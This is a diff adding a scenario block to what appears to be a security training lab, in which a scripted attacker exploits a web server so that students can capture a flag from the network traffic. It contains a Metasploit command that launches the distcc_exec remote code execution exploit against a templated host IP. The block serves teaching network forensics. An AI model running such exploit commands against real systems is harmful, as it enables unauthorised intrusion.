@@ -1,0 +1,20 @@
+	<attack>
+		<get_shell>msfconsole -x "use exploit/unix/misc/distcc_exec; set RHOST <%= $web_server_ip %>; exploit"</get_shell>
+		<post_command>whoami > /dev/null; echo "<%= $flags.pop %>" > /dev/null; echo 'Find the flag! (in the network traffic)'</post_command>
+
+		<prompt>Your webserver is about to be scanned/attacked. Use Tcpdump and/or Wireshark to view the behaviour of the attacker. There is a flag to be found over the wire. </prompt>
+
+		<condition>
+			<output_matches>Find the flag</output_matches>
+			<message>Hope you caught that.</message>
+			<trigger_next_attack />
+		</condition>
+		<condition>
+			<output_matches>1</output_matches>
+			<message>:( Failed to contact the web server (<%= $web_server_ip %>)</message>
+		</condition>
+		<else_condition>
+			<message>:( Something was not right...</message>
+		</else_condition>
+
+	</attack>
